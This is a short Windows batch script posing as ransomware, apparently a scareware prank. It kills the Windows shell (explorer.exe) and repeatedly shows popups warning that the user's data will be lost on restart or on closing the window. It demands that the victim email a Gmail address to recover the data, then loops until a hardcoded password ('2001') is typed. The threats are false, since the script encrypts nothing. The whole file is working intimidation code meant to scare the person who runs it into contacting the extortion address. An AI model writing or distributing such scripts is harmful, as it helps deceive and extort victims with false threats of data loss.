color 0A
@echo off 
title TEXTO
taskkill /f /im explorer.exe 
:bucle 
cls               
msg * READ CAREFULLY
msg * If you restart your computer, your data will be lost
msg * If you close this window, your data will also be lost
msg * Write to n3ur4ln37w0rk@gmail.com to recover your data
msg * :(
msg * -_-
echo =============================================
echo Write to n3ur4ln37w0rk@gmail.com to get the password
echo =============================================
echo Whrite the password
echo =============================================
set /p pass=2001: 
if %pass%==2001 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
start https://sp.depositphotos.com/238862344/stock-illustration-congratulations-banner-with-colorful-paint.html
echo Congratulations!!!
pause
exit
